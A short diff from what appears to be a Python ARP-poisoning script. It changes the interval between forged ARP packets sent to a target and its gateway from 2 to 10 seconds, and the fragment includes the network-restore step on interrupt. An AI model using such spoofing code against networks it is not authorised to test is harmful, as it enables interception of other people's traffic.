@@ -51,7 +51,7 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
         while True:
             send(poison_target)
             send(poison_gateway)
-            sleep(2)
+            sleep(10)
     except KeyboardInterrupt:
         restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
     print("[*] ARP poison attack finished.")
